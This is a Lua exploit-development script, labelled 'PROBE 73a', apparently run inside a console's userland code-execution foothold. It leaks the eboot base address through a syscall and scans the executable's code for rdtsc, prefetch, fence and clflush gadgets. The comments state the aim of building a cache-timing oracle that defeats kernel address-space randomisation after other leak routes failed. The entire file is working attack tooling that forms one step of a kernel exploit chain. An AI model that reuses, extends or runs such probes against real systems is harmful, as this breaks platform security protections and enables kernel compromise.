-- CRASH_CLASS: LOW
-- PROBE 73a: Scan eboot for RDTSC/RDTSCP/PREFETCH timing gadgets
--
-- Context: All KASLR info leak surfaces are exhausted (69d/69j/69k/69n/72d
-- confirmed no kernel pointer leakage through any readback interface).
-- A timing-based KASLR oracle is the remaining avenue.
--
-- Previous mprotect timing (56h-56i2) used clock_gettime (~90us overhead).
-- RDTSC gives ~1ns resolution. If eboot contains rdtsc;ret, we can time
-- kernel operations precisely enough to detect cache-line effects from
-- kernel page access patterns.
--
-- Scans for:
--   0F 31          rdtsc (returns TSC in EDX:EAX)
--   0F 01 F9       rdtscp (TSC + IA32_TSC_AUX in ECX)
--   0F 18 xx       prefetcht0/1/2/nta (speculative cache load)
--   0F 0D xx       prefetchw (AMD-specific write prefetch)
--   0F AE xx       lfence (0F AE E8), mfence (0F AE F0), clflush (0F AE /7)
--   48 0F C7 xx    cmpxchg16b (for atomic 128-bit ops)

print("=== PROBE 73a: TIMING GADGET SCAN ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local tlo = rd(N(info) + 0x108)
local thi = rd(N(info) + 0x10C)
if not tlo or not thi then print("NO EBOOT BASE"); return end
local eboot_base = uint64(string.format("0x%X%08X", thi, tlo))
print("eboot_base=" .. string.format("0x%X%08X", thi, tlo))

local text_size = 0x4A0000

local function rb(off)
    local addr = uint64(string.format("0x%X%08X", thi, tlo + off))
    local ok, v = pcall(function() return memory.read_byte(addr) end)
    if ok then return N(v) end return nil
end

local hits = {
    rdtsc = {},
    rdtscp = {},
    prefetch = {},
    prefetchw = {},
    lfence = {},
    mfence = {},
    clflush = {},
    sfence = {},
}

print(string.format("Scanning 0x%X bytes of eboot .text...", text_size))

local total_hits = 0
local STEP = 0x80000

for off = 0, text_size - 2 do
    if not alive() then print("DEAD at offset " .. off); break end

    local b0 = rb(off)
    if not b0 then break end

    if b0 == 0x0F then
        local b1 = rb(off + 1)
        if b1 then
            -- RDTSC: 0F 31
            if b1 == 0x31 then
                local b2 = rb(off + 2)
                local ctx = ""
                if b2 == 0xC3 then ctx = " *** rdtsc;ret FOUND ***" end
                table.insert(hits.rdtsc, {off = off, next = b2, ctx = ctx})
                total_hits = total_hits + 1
                print(string.format("  +0x%06X: RDTSC (0F 31) next=0x%02X%s", off, b2 or 0, ctx))
            end

            -- RDTSCP: 0F 01 F9
            if b1 == 0x01 then
                local b2 = rb(off + 2)
                if b2 == 0xF9 then
                    local b3 = rb(off + 3)
                    local ctx = ""
                    if b3 == 0xC3 then ctx = " *** rdtscp;ret FOUND ***" end
                    table.insert(hits.rdtscp, {off = off, next = b3, ctx = ctx})
                    total_hits = total_hits + 1
                    print(string.format("  +0x%06X: RDTSCP (0F 01 F9) next=0x%02X%s", off, b3 or 0, ctx))
                end
            end

            -- PREFETCH: 0F 18 /0-3 (prefetchnta, t0, t1, t2)
            if b1 == 0x18 then
                local b2 = rb(off + 2)
                if b2 then
                    local modrm_reg = math.floor(b2 / 8) % 8
                    if modrm_reg <= 3 then
                        local names = {"prefetchnta", "prefetcht0", "prefetcht1", "prefetcht2"}
                        table.insert(hits.prefetch, {off = off, modrm = b2, name = names[modrm_reg + 1]})
                        total_hits = total_hits + 1
                        print(string.format("  +0x%06X: %s (0F 18 %02X)", off, names[modrm_reg + 1], b2))
                    end
                end
            end

            -- PREFETCHW: 0F 0D /1
            if b1 == 0x0D then
                local b2 = rb(off + 2)
                if b2 then
                    local modrm_reg = math.floor(b2 / 8) % 8
                    if modrm_reg == 1 then
                        table.insert(hits.prefetchw, {off = off, modrm = b2})
                        total_hits = total_hits + 1
                        print(string.format("  +0x%06X: prefetchw (0F 0D %02X)", off, b2))
                    end
                end
            end

            -- LFENCE: 0F AE E8
            if b1 == 0xAE then
                local b2 = rb(off + 2)
                if b2 == 0xE8 then
                    table.insert(hits.lfence, {off = off})
                    total_hits = total_hits + 1
                    print(string.format("  +0x%06X: LFENCE (0F AE E8)", off))
                elseif b2 == 0xF0 then
                    table.insert(hits.mfence, {off = off})
                    total_hits = total_hits + 1
                    print(string.format("  +0x%06X: MFENCE (0F AE F0)", off))
                elseif b2 == 0xF8 then
                    table.insert(hits.sfence, {off = off})
                    total_hits = total_hits + 1
                    print(string.format("  +0x%06X: SFENCE (0F AE F8)", off))
                elseif b2 then
                    local modrm_reg = math.floor(b2 / 8) % 8
                    if modrm_reg == 7 and b2 < 0xC0 then
                        table.insert(hits.clflush, {off = off, modrm = b2})
                        total_hits = total_hits + 1
                        print(string.format("  +0x%06X: CLFLUSH (0F AE %02X)", off, b2))
                    end
                end
            end
        end
    end

    if off % STEP == 0 and off > 0 then
        print(string.format("  ... scanned 0x%X / 0x%X (%d hits)", off, text_size, total_hits))
    end
end

print("")
print("[B] SUMMARY")
print(string.format("  rdtsc:      %d", #hits.rdtsc))
print(string.format("  rdtscp:     %d", #hits.rdtscp))
print(string.format("  prefetch:   %d", #hits.prefetch))
print(string.format("  prefetchw:  %d", #hits.prefetchw))
print(string.format("  lfence:     %d", #hits.lfence))
print(string.format("  mfence:     %d", #hits.mfence))
print(string.format("  sfence:     %d", #hits.sfence))
print(string.format("  clflush:    %d", #hits.clflush))
print(string.format("  TOTAL:      %d", total_hits))

-- Check for usable rdtsc gadgets
local rdtsc_usable = false
for _, h in ipairs(hits.rdtsc) do
    if h.next == 0xC3 then rdtsc_usable = true end
end
for _, h in ipairs(hits.rdtscp) do
    if h.next == 0xC3 then rdtsc_usable = true end
end

if rdtsc_usable then
    print("")
    print("*** RDTSC;RET GADGET AVAILABLE ***")
    print("Can build precise timing primitive for cache-based KASLR")
else
    print("")
    print("No rdtsc;ret gadget. Check if rdtsc is near enough to ret")
    print("for a usable gadget chain (rdtsc; <few insns>; ret)")
    for _, h in ipairs(hits.rdtsc) do
        local context = {}
        for i = 0, 15 do
            local b = rb(h.off + 2 + i)
            if b then table.insert(context, string.format("%02X", b))
            else break end
        end
        print(string.format("  +0x%06X: rdtsc + %s", h.off, table.concat(context, " ")))
    end
end

print("")
print("alive=" .. (alive() and "YES" or "NO"))
print("=== PROBE 73a COMPLETE ===")
